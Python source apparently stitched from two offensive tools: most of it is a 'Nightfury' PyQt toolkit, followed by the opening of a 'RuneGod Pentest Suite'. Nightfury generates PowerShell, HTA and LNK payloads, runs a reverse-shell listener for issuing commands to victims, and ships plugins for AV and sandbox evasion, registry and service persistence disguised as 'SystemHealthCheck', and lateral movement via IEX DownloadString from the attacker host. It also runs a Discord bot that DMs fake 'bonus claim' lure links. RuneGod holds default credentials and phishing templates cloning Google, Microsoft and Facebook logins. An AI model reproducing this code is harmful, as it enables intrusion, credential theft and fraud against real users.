            dialog.setWindowTitle(f"Configure {plugin.name}")
            dialog.setModal(True)
            dialog.setMinimumWidth(400)
            
            layout = QVBoxLayout()
            layout.addWidget(QLabel(f"Configuration options for {plugin.name}"))
            
            # Add plugin-specific configuration options here
            
            buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
            buttons.accepted.connect(dialog.accept)
            buttons.rejected.connect(dialog.reject)
            layout.addWidget(buttons)
            
            dialog.setLayout(layout)
            
            if dialog.exec_() == QDialog.Accepted:
                self.activity_list.addItem(f"[*] Configured plugin: {plugin.name}")
        else:
            QMessageBox.warning(self, "Error", f"Plugin {plugin_name} is not loaded")
    
    def create_campaign(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Create Phishing Campaign")
        dialog.setModal(True)
        dialog.setMinimumWidth(500)
        
        layout = QVBoxLayout()
        
        form_layout = QFormLayout()
        
        campaign_name = QLineEdit()
        campaign_name.setPlaceholderText("Enter campaign name")
        form_layout.addRow("Campaign Name:", campaign_name)
        
        target_email = QLineEdit()
        target_email.setPlaceholderText("Enter target email address")
        form_layout.addRow("Target Email:", target_email)
        
        subject = QLineEdit()
        subject.setPlaceholderText("Enter email subject")
        form_layout.addRow("Subject:", subject)
        
        template = QComboBox()
        template.addItems(["Reward Notification", "Security Alert", "Password Reset", "Invoice"])
        form_layout.addRow("Template:", template)
        
        layout.addLayout(form_layout)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() == QDialog.Accepted:
            self.activity_list.addItem(f"[+] Created phishing campaign: {campaign_name.text()}")
            QMessageBox.information(self, "Success", "Phishing campaign created successfully")
    
    def view_campaign_stats(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Campaign Statistics")
        dialog.setModal(True)
        dialog.setMinimumSize(600, 400)
        
        layout = QVBoxLayout()
        
        # Create a simple table with mock data
        table = QTableWidget()
        table.setColumnCount(4)
        table.setHorizontalHeaderLabels(["Campaign", "Sent", "Clicked", "Executed"])
        
        # Add some mock data
        table.setRowCount(3)
        table.setItem(0, 0, QTableWidgetItem("Reward Campaign"))
        table.setItem(0, 1, QTableWidgetItem("100"))
        table.setItem(0, 2, QTableWidgetItem("45"))
        table.setItem(0, 3, QTableWidgetItem("22"))
        
        table.setItem(1, 0, QTableWidgetItem("Security Alert"))
        table.setItem(1, 1, QTableWidgetItem("80"))
        table.setItem(1, 2, QTableWidgetItem("32"))
        table.setItem(1, 3, QTableWidgetItem("15"))
        
        table.setItem(2, 0, QTableWidgetItem("Password Reset"))
        table.setItem(2, 1, QTableWidgetItem("120"))
        table.setItem(2, 2, QTableWidgetItem("65"))
        table.setItem(2, 3, QTableWidgetItem("38"))
        
        table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(table)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Close)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        dialog.exec_()
    
    def test_payload(self):
        if not self.current_payload:
            QMessageBox.warning(self, "Warning", "No payload generated to test")
            return
            
        dialog = QDialog(self)
        dialog.setWindowTitle("Test Payload in Sandbox")
        dialog.setModal(True)
        dialog.setMinimumWidth(400)
        
        layout = QVBoxLayout()
        layout.addWidget(QLabel("Testing payload in isolated environment..."))
        
        progress = QProgressBar()
        progress.setRange(0, 0)  # Indeterminate progress
        layout.addWidget(progress)
        
        result = QLabel()
        result.setWordWrap(True)
        layout.addWidget(result)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok)
        buttons.accepted.connect(dialog.accept)
        buttons.setEnabled(False)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        # Simulate testing process
        def update_test():
            time.sleep(3)  # Simulate testing time
            result.setText("✅ Payload passed basic evasion tests\n\n❌ Detected by 2/26 AV engines\n\n⚠️  Recommend increasing obfuscation level")
            progress.setRange(0, 100)
            progress.setValue(100)
            buttons.setEnabled(True)
            
        threading.Thread(target=update_test, daemon=True).start()
        
        dialog.exec_()
    
    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "127.0.0.1"
    
    def save_config(self):
        try:
            self.config['lhost'] = self.lhost_input.text()
            self.config['lport'] = int(self.lport_input.text())
            self.config['auto_server_port'] = int(self.server_port_input.text())
            self.config['domain'] = self.domain_input.text()
            self.config['obfuscation_level'] = self.obf_level.currentIndex() + 1
            self.config['persistence'] = self.persistence_cb.isChecked()
            self.config['evasion_techniques'] = self.evasion_cb.isChecked()
            self.config['platform'] = self.platform_combo.currentText().lower()
            self.config['payload_type'] = self.payload_type_combo.currentText().lower().replace(' ', '_')
            self.config['discord_token'] = self.discord_token_input.text()
            self.config['auto_start_server'] = self.auto_server_cb.isChecked()
            self.config['auto_start_bot'] = self.auto_bot_cb.isChecked()
            
            self.status_bar.showMessage("✅ Configuration saved", 3000)
            self.activity_list.addItem("[*] Configuration saved")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_payload(self, platform=None):
        try:
            self.save_config()
            
            target_platform = platform or self.config['platform']
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                target_platform,
                self.config['payload_type']
            )
            self.current_payload = payload.generate()
            
            # Display payload
            self.payload_preview.setPlainText(self.current_payload)
            self.save_btn.setEnabled(True)
            self.copy_btn.setEnabled(True)
            self.test_btn.setEnabled(True)
            
            self.status_bar.showMessage("✅ Payload generated successfully", 3000)
            self.activity_list.addItem(f"[+] Generated {target_platform} payload")
            
            # Update payload count
            current_count = int(self.payload_count.text())
            self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_hta(self):
        try:
            self.save_config()
            
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                "windows",
                self.config['payload_type']
            )
            hta_content = payload.generate_hta()
            self.current_payload = hta_content
            
            # Display HTA content
            self.payload_preview.setPlainText(self.current_payload)
            self.save_btn.setEnabled(True)
            self.copy_btn.setEnabled(True)
            self.test_btn.setEnabled(True)
            
            self.status_bar.showMessage("✅ HTA payload generated successfully", 3000)
            self.activity_list.addItem("[+] Generated HTA payload")
            
            # Update payload count
            current_count = int(self.payload_count.text())
            self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_lnk(self):
        try:
            self.save_config()
            
            payload = NightfuryPayload(
                self.config['lhost'],
                self.config['lport'],
                self.config['obfuscation_level'],
                self.config['persistence'],
                self.config['evasion_techniques'],
                "windows",
                self.config['payload_type']
            )
            
            # Generate LNK file
            filename, _ = QFileDialog.getSaveFileName(
                self, "Save LNK File", "Shortcut.lnk", "Shortcut Files (*.lnk)"
            )
            
            if filename:
                lnk_path = payload.generate_lnk(filename)
                self.current_payload = f"LNK file generated at: {lnk_path}"
                
                # Display LNK info
                self.payload_preview.setPlainText(self.current_payload)
                self.save_btn.setEnabled(False)  # Already saved
                self.copy_btn.setEnabled(False)
                self.test_btn.setEnabled(True)
                
                self.status_bar.showMessage("✅ LNK payload generated successfully", 3000)
                self.activity_list.addItem("[+] Generated LNK payload")
                
                # Update payload count
                current_count = int(self.payload_count.text())
                self.payload_count.setText(str(current_count + 1))
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def save_payload(self):
        try:
            if not self.current_payload:
                raise Exception("No payload generated")
            
            filename, _ = QFileDialog.getSaveFileName(
                self, "Save Payload", "payload.ps1", "PowerShell Scripts (*.ps1);;All Files (*)"
            )
            
            if filename:
                with open(filename, "w") as f:
                    f.write(self.current_payload)
                self.status_bar.showMessage(f"✅ Payload saved to {filename}", 5000)
                self.activity_list.addItem(f"[+] Payload saved to {filename}")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def copy_payload(self):
        try:
            if not self.current_payload:
                raise Exception("No payload generated")
            
            clipboard = QApplication.clipboard()
            clipboard.setText(self.current_payload)
            self.status_bar.showMessage("✅ Payload copied to clipboard", 3000)
            self.activity_list.addItem("[+] Payload copied to clipboard")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_listener(self):
        try:
            self.save_config()
            
            if not self.config['lhost'] or not self.config['lport']:
                raise Exception("Please configure LHOST and LPORT first")
            
            # Create listener socket
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((self.config['lhost'], self.config['lport']))
            self.listener_socket.listen(5)
            
            # Start listener thread
            self.listener_thread = threading.Thread(target=self.listen_for_connections, daemon=True)
            self.listener_thread.start()
            
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.command_input.setEnabled(True)
            self.send_btn.setEnabled(True)
            self.connection_status.setText(f"🟢 Listening on {self.config['lhost']}:{self.config['lport']}")
            self.connection_status.setStyleSheet("color: green; font-weight: bold; font-size: 14px;")
            self.activity_list.addItem(f"[+] Listener started on {self.config['lhost']}:{self.config['lport']}")
            
            self.status_bar.showMessage("✅ Listener started", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Listener error: {str(e)}", 5000)
    
    def listen_for_connections(self):
        while True:
            try:
                client_socket, addr = self.listener_socket.accept()
                ip, port = addr
                
                # Add to active connections
                self.active_connections.append({
                    'socket': client_socket,
                    'address': f"{ip}:{port}",
                    'active': True
                })
                
                # Update UI
                self.activity_list.addItem(f"[+] New connection from {ip}:{port}")
                self.connections_list.addItem(f"{ip}:{port}")
                
                # Start client handler
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, f"{ip}:{port}"),
                    daemon=True
                )
                client_thread.start()
            except:
                break
    
    def handle_client(self, client_socket, client_id):
        try:
            # Send initial prompt
            if self.config['platform'] == "windows":
                client_socket.send(b"PS C:\\> ")
            else:
                client_socket.send(b"$ ")
            
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                try:
                    # Execute command
                    cmd = data.decode().strip()
                    if cmd.lower() == "exit":
                        break
                    
                    self.command_output.append(f"[{client_id}] > {cmd}")
                    
                    # Run command and capture output
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    output = result.stdout + result.stderr
                    
                    if self.config['platform'] == "windows":
                        output += f"\nPS {os.getcwd()}> "
                    else:
                        output += f"\n$ "
                except Exception as e:
                    if self.config['platform'] == "windows":
                        output = f"Error: {str(e)}\nPS {os.getcwd()}> "
                    else:
                        output = f"Error: {str(e)}\n$ "
                
                client_socket.send(output.encode())
                self.command_output.append(f"[{client_id}] {output}")
        except:
            pass
        
        # Remove connection
        self.activity_list.addItem(f"[-] Connection closed: {client_id}")
        for i, conn in enumerate(self.active_connections):
            if conn['address'] == client_id:
                self.active_connections.pop(i)
                break
        
        # Remove from UI
        items = self.connections_list.findItems(client_id, Qt.MatchExactly)
        for item in items:
            row = self.connections_list.row(item)
            self.connections_list.takeItem(row)
        
        client_socket.close()
    
    def stop_listener(self):
        try:
            # Close all client sockets
            for conn in self.active_connections:
                try:
                    conn['socket'].close()
                except:
                    pass
            
            # Close listener socket
            self.listener_socket.close()
            self.active_connections = []
            
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.command_input.setEnabled(False)
            self.send_btn.setEnabled(False)
            self.connection_status.setText("🔴 Listener stopped")
            self.connection_status.setStyleSheet("color: red; font-weight: bold; font-size: 14px;")
            self.activity_list.addItem("[+] Listener stopped")
            
            # Clear connections list
            self.connections_list.clear()
            
            self.status_bar.showMessage("✅ Listener stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping listener: {str(e)}", 5000)
    
    def send_command(self):
        try:
            command = self.command_input.text().strip()
            if not command:
                return
            
            # Get selected connection
            selected_items = self.connections_list.selectedItems()
            if not selected_items:
                raise Exception("Select a connection first")
            
            client_id = selected_items[0].text()
            
            # Find client socket
            for conn in self.active_connections:
                if conn['address'] == client_id:
                    conn['socket'].send(f"{command}\n".encode())
                    self.command_output.append(f"[{client_id}] > {command}")
                    self.command_input.clear()
                    return
            
            raise Exception("Connection not found")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_auto_server(self):
        try:
            self.save_config()
            
            if not self.config['lhost'] or not self.config['lport']:
                raise Exception("Configure LHOST and LPORT first")
            
            # Create HTTP server with custom parameters
            server_address = ('', self.config['auto_server_port'])
            
            # Create a custom handler class with our config
            class CustomHandler(AutoExecutionServer):
                pass
                
            setattr(CustomHandler, 'server', self)
            setattr(CustomHandler, 'lhost', self.config['lhost'])
            setattr(CustomHandler, 'lport', self.config['lport'])
            setattr(CustomHandler, 'obfuscation_level', self.config['obfuscation_level'])
            setattr(CustomHandler, 'persistence', self.config['persistence'])
            setattr(CustomHandler, 'evasion_techniques', self.config['evasion_techniques'])
            setattr(CustomHandler, 'platform', self.config['platform'])
            setattr(CustomHandler, 'domain', self.config['domain'])
            
            self.http_server = HTTPServer(server_address, CustomHandler)
            self.http_server.is_running = True
            
            # Start server in a separate thread
            server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            server_thread.start()
            
            self.start_server_btn.setEnabled(False)
            self.stop_server_btn.setEnabled(True)
            
            # Generate claim URL
            claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/"
            self.server_url.setText(claim_url)
            
            # Generate QR code
            qr = qrcode.QRCode()
            qr.add_data(claim_url)
            qr_img = qr.make_image(fill_color="black", back_color="white")
            
            # Convert to QPixmap
            img_byte_arr = io.BytesIO()
            qr_img.save(img_byte_arr, format='PNG')
            qpixmap = QPixmap()
            qpixmap.loadFromData(img_byte_arr.getvalue())
            self.qr_label.setPixmap(qpixmap)
            
            self.activity_list.addItem(f"[+] Auto-server started: {claim_url}")
            self.server_status.setText("Running")
            self.server_status.setStyleSheet("color: green; font-weight: bold; font-size: 24px;")
            self.status_bar.showMessage(f"✅ Auto-server started on port {self.config['auto_server_port']}", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Server error: {str(e)}", 5000)
    
    def stop_auto_server(self):
        try:
            if self.http_server:
                self.http_server.shutdown()
                self.http_server.server_close()
                
                self.start_server_btn.setEnabled(True)
                self.stop_server_btn.setEnabled(False)
                self.server_url.clear()
                self.qr_label.clear()
                
                self.activity_list.addItem("[+] Auto-server stopped")
                self.server_status.setText("Stopped")
                self.server_status.setStyleSheet("color: red; font-weight: bold; font-size: 24px;")
                self.status_bar.showMessage("✅ Auto-server stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping server: {str(e)}", 5000)
    
    def copy_claim_url(self):
        try:
            if self.server_url.text():
                clipboard = QApplication.clipboard()
                clipboard.setText(self.server_url.text())
                self.status_bar.showMessage("✅ Claim URL copied to clipboard", 3000)
                self.activity_list.addItem("[+] Claim URL copied to clipboard")
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_discord_bot(self):
        try:
            self.save_config()
            
            if not self.config['discord_token']:
                raise Exception("Enter Discord token")
            
            # Create and start Discord bot
            intents = discord.Intents.default()
            intents.message_content = True
            intents.members = True
            
            self.discord_bot = commands.Bot(
                command_prefix='!',
                intents=intents
            )
            
            @self.discord_bot.event
            async def on_ready():
                self.bot_status.setText("Bot status: ✅ Connected")
                self.bot_status_dash.setText("Running")
                self.bot_status_dash.setStyleSheet("color: green; font-weight: bold; font-size: 24px;")
                self.activity_list.addItem("[+] Discord bot connected")
            
            @self.discord_bot.command()
            async def claim(ctx):
                # Generate a unique claim token
                claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/?token={claim_token}"
                
                # Create embed message
                embed = discord.Embed(
                    title="🎁 Exclusive Bonus Claim",
                    description="You've been selected for a special reward!",
                    color=0x00ff00
                )
                embed.add_field(
                    name="Claim Instructions",
                    value=f"Click [here]({claim_url}) to claim your bonus immediately!",
                    inline=False
                )
                embed.add_field(
                    name="Important",
                    value="This offer expires in 10 minutes. Claim now before it's gone!",
                    inline=False
                )
                embed.set_footer(text="Reward Center - Official Distribution")
                
                try:
                    await ctx.author.send(embed=embed)
                    await ctx.send(f"{ctx.author.mention}, check your DMs for your exclusive bonus claim!")
                    self.activity_list.addItem(f"[+] Sent bonus claim to {ctx.author}")
                except discord.Forbidden:
                    await ctx.send(f"{ctx.author.mention}, I couldn't DM you. Please enable DMs!")
            
            # Start bot in a separate thread
            bot_thread = threading.Thread(target=self.discord_bot.run, args=(self.config['discord_token'],), daemon=True)
            bot_thread.start()
            
            self.start_bot_btn.setEnabled(False)
            self.stop_bot_btn.setEnabled(True)
            self.bot_status.setText("Bot status: ⚡ Starting...")
            
            self.status_bar.showMessage("✅ Discord bot started. Use '!claim' in Discord", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Bot error: {str(e)}", 5000)
    
    def stop_discord_bot(self):
        try:
            if self.discord_bot:
                asyncio.run(self.discord_bot.close())
                
                self.start_bot_btn.setEnabled(True)
                self.stop_bot_btn.setEnabled(False)
                self.bot_status.setText("Bot status: 🔴 Stopped")
                self.bot_status_dash.setText("Stopped")
                self.bot_status_dash.setStyleSheet("color: red; font-weight: bold; font-size: 24px;")
                
                self.activity_list.addItem("[+] Discord bot stopped")
                self.status_bar.showMessage("✅ Discord bot stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping bot: {str(e)}", 5000)
    
    def update_connection_status(self):
        # Update connection count in status bar
        connection_count = len(self.active_connections)
        self.conn_count.setText(str(connection_count))
        
        # Update connection graph
        self.connection_graph.add_data_point(connection_count)
        
        status = f"✅ System Ready | Connections: {connection_count}"
        if hasattr(self, 'http_server') and self.http_server and self.http_server.is_running:
            status += " | Server: Running"
        if self.discord_bot:
            status += " | Bot: Running"
        self.status_bar.showMessage(status)
    
    def update_stats(self):
        # Update connection stats
        self.connection_stats.append(len(self.active_connections))
        if len(self.connection_stats) > 50:
            self.connection_stats.pop(0)
    
    def show_settings(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Settings")
        dialog.setModal(True)
        dialog.setMinimumWidth(400)
        
        layout = QVBoxLayout()
        
        # Theme selection
        theme_group = QGroupBox("Theme")
        theme_layout = QVBoxLayout()
        
        theme_combo = QComboBox()
        theme_combo.addItems(["Dark", "Light", "System"])
        theme_layout.addWidget(theme_combo)
        
        theme_group.setLayout(theme_layout)
        layout.addWidget(theme_group)
        
        # Logging settings
        log_group = QGroupBox("Logging")
        log_layout = QVBoxLayout()
        
        log_level = QComboBox()
        log_level.addItems(["Debug", "Info", "Warning", "Error"])
        log_layout.addWidget(QLabel("Log Level:"))
        log_layout.addWidget(log_level)
        
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() == QDialog.Accepted:
            self.activity_list.addItem("[*] Settings updated")
            QMessageBox.information(self, "Settings", "Settings updated successfully")

# ==============================
# PLUGIN IMPLEMENTATIONS
# ==============================

class AVEvasionPlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "AV Evasion"
        self.version = "1.0"
        self.description = "Advanced AV evasion techniques including code obfuscation and sandbox detection"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] AV Evasion plugin initialized")
    
    def execute(self, payload):
        # Apply additional AV evasion techniques
        evasion_payload = self._apply_evasion(payload)
        return evasion_payload
    
    def _apply_evasion(self, payload):
        # Add sandbox detection
        sandbox_detection = '''
        # Sandbox detection
        $isSandbox = $false
        if (Get-WmiObject -Class Win32_ComputerSystem | Where-Object { $_.Model -like "*Virtual*" }) { $isSandbox = $true }
        if (Get-WmiObject -Class Win32_BIOS | Where-Object { $_.SerialNumber -like "*VMware*" }) { $isSandbox = $true }
        if (($env:USERNAME).ToLower() -eq "sandbox") { $isSandbox = $true }
        
        if (-not $isSandbox) {
            # Continue with payload
        '''
        
        # Add the sandbox detection to the payload
        if "windows" in payload.lower():
            payload = sandbox_detection + payload + "\n}"
        
        return payload

class PersistencePlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "Persistence"
        self.version = "1.0"
        self.description = "Advanced persistence mechanisms including scheduled tasks, registry modifications, and service creation"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] Persistence plugin initialized")
    
    def execute(self, payload):
        # Apply additional persistence techniques
        persistent_payload = self._apply_persistence(payload)
        return persistent_payload
    
    def _apply_persistence(self, payload):
        # Add additional persistence mechanisms
        extra_persistence = '''
        # Registry persistence
        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $regName = "SystemHealthCheck"
        $regValue = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" + $payload + "\\""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        
        # Service persistence
        $serviceName = "SystemHealthService"
        if (-not (Get-Service $serviceName -ErrorAction SilentlyContinue)) {
            New-Service -Name $serviceName -BinaryPathName $regValue -Description "System Health Monitoring Service" -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service $serviceName -ErrorAction SilentlyContinue
        }
        '''
        
        # Add the extra persistence to the payload
        if "windows" in payload.lower():
            payload = payload + extra_persistence
        
        return payload

class LateralMovementPlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "Lateral Movement"
        self.version = "1.0"
        self.description = "Lateral movement techniques including WMI, PSExec, and PowerShell Remoting"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] Lateral Movement plugin initialized")
    
    def execute(self, target):
        # Attempt lateral movement to target
        return self._lateral_move(target)
    
    def _lateral_move(self, target):
        # Implement lateral movement techniques
        movement_script = f'''
        # Attempt lateral movement to {target}
        try {{
            # WMI execution
            $cred = Get-Credential
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -ExecutionPolicy Bypass -Command \\"IEX (New-Object Net.WebClient).DownloadString('http://{self.core.config['lhost']}/payload.ps1')\\""
            
            # PowerShell Remoting
            Invoke-Command -ComputerName {target} -ScriptBlock {{ 
                IEX (New-Object Net.WebClient).DownloadString('http://{self.core.config['lhost']}/payload.ps1')
            }} -Credential $cred
            
            return "Lateral movement attempted to {target}"
        }}
        catch {{
            return "Lateral movement failed: $($_.Exception.Message)"
        }}
        '''
        
        return movement_script

# ==============
# MAIN EXECUTION
# ==============

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    
    # Set application font
    font = QFont("Consolas", 10)
    app.setFont(font)
    
    window = NightfuryGUI()
    window.show()
    sys.exit(app.exec_())



#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import json
import re
import time
import argparse
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, Menu
import nmap
import dns.resolver
import requests
from bs4 import BeautifulSoup
from datetime import datetime
from collections import defaultdict

# ASCII Banner
BANNER = r"""
██████╗ ██╗   ██╗███╗   ██╗███████╗    ██████╗  ██████╗ ██████╗
██╔══██╗██║   ██║████╗  ██║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██████╔╝██║   ██║██╔██╗ ██║█████╗      ██║  ██║██║     ██║
██╔══██╗██║   ██║██║╚██╗██║██╔══╝      ██║  ██║██║     ██║
██║  ██║╚██████╔╝██║ ╚████║███████╗    ██████╔╝╚██████╗╚██████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚═════╝  ╚═════╝ ╚═════╝

██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗██╗   ██╗██╗████████╗███████╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║   ██║██║╚══██╔══╝██╔════╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   ██║   ██║██║   ██║   █████╗
██╔══██╗██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   ██║   ██║██║   ██║   ██╔══╝
██║  ██║███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   ╚██████╔╝██║   ██║   ███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
"""

class RuneGodPentestSuite:
    def __init__(self, root):
        self.root = root
        self.root.title("RuneGod Pentest Suite - Ultimate Edition")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1e1e1e')

        # Configuration
        self.targets = []
        self.output_dir = f"rune_god_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.wordlists_dir = "/usr/share/wordlists"
        self.creds = ["admin:admin", "admin:password", "test:test"]
        self.reports_dir = f"{self.output_dir}/reports"
        self.scans_dir = f"{self.output_dir}/scans"
        self.exploits_dir = f"{self.output_dir}/exploits"
        self.log_file = f"{self.output_dir}/rune_god.log"

        # Create directories
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.reports_dir, exist_ok=True)
        os.makedirs(self.scans_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        open(self.log_file, 'a').close()

        # Setup style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('.', background='#1e1e1e', foreground='#00ff00')
        self.style.configure('TFrame', background='#1e1e1e')
        self.style.configure('TLabel', background='#1e1e1e', foreground='#00ff00')
        self.style.configure('TButton', background='#3c3c3c', foreground='white')
        self.style.configure('TNotebook', background='#1e1e1e')
        self.style.configure('TNotebook.Tab', background='#2c2c2c', foreground='white')
        self.style.map('TNotebook.Tab', background=[('selected', '#3c3c3c')])

        self.create_widgets()
        self.create_menu()
        self.check_dependencies()

        # Initialize targets
        self.targets_file = "targets.txt"
        self.load_targets()

        # Phishing templates
        self.phishing_templates = {
            "Google Login": {
                "url": "https://accounts.google.com/",
                "form_action": "https://accounts.google.com/signin/v1/lookup",
                "username_field": "identifier",
                "password_field": "password"
            },
            "Microsoft Login": {
                "url": "https://login.microsoftonline.com/",
                "form_action": "https://login.microsoftonline.com/common/login",
                "username_field": "loginfmt",
                "password_field": "passwd"
            },
            "Facebook Login": {
                "url": "https://www.facebook.com/login.php",
                "form_action": "https://www.facebook.com/login/device-based/regular/login/",
                "username_field": "email",
                "password_field": "pass"
            },
            "Custom Page": {
                "url": "",
                "form_action": "",
                "username_field": "",
                "password_field": ""
            }
        }

        # Log initialization
        self.log(f"RuneGod Pentest Suite initialized at {datetime.now()}")
        self.log(f"Output directory: {self.output_dir}")

    def check_dependencies(self):
        """Check and install required dependencies"""
        required_tools = ["nmap", "nikto", "whatweb", "wafw00f", "hydra", "sqlmap", "rustscan"]
        missing = []

        for tool in required_tools:
            if not shutil.which(tool):
                missing.append(tool)

        if missing:
            self.log("Installing missing dependencies...")
            try:
                subprocess.run(["sudo", "apt", "update"], check=True)
                install_cmd = ["sudo", "apt", "install", "-y"] + missing
                subprocess.run(install_cmd, check=True)
                self.log("Dependencies installed successfully!")
            except Exception as e:
                self.log(f"Error installing dependencies: {str(e)}")
                messagebox.showerror("Dependency Error",
                    f"Failed to install: {', '.join(missing)}\nPlease install manually.")

    def create_menu(self):
        """Create the main menu bar"""
        menu_bar = Menu(self.root)
        self.root.config(menu=menu_bar)

        # File menu
        file_menu = Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="New Session", command=self.new_session)
        file_menu.add_command(label="Save Session", command=self.save_session)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menu_bar.add_cascade(label="File", menu=file_menu)

        # Tools menu
        tools_menu = Menu(menu_bar, tearoff=0)
        tools_menu.add_command(label="Run Full Pentest", command=self.run_full_pentest)
        tools_menu.add_command(label="Generate Report", command=self.generate_report)
        menu_bar.add_cascade(label="Tools", menu=tools_menu)

        # View menu
        view_menu = Menu(menu_bar, tearoff=0)
        view_menu.add_command(label="Show Console", command=self.show_console)
        view_menu.add_command(label="Clear Console", command=self.clear_console)
        menu_bar.add_cascade(label="View", menu=view_menu)

        # Help menu
        help_menu = Menu(menu_bar, tearoff=0)
        help_menu.add_command(label="Documentation", command=self.show_docs)
        help_menu.add_command(label="About", command=self.show_about)
        menu_bar.add_cascade(label="Help", menu=help_menu)

    def create_widgets(self):
        # Header Frame
        header_frame = ttk.Frame(self.root)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        # Banner
        banner_label = ttk.Label(header_frame, text=BANNER, font=('Courier', 8),
                                foreground='#00ff00', background='#1e1e1e', justify=tk.LEFT)
        banner_label.pack()

        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Notebook (Tabs)
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Reconnaissance Tab
        recon_frame = ttk.Frame(notebook)
        self.setup_recon_tab(recon_frame)
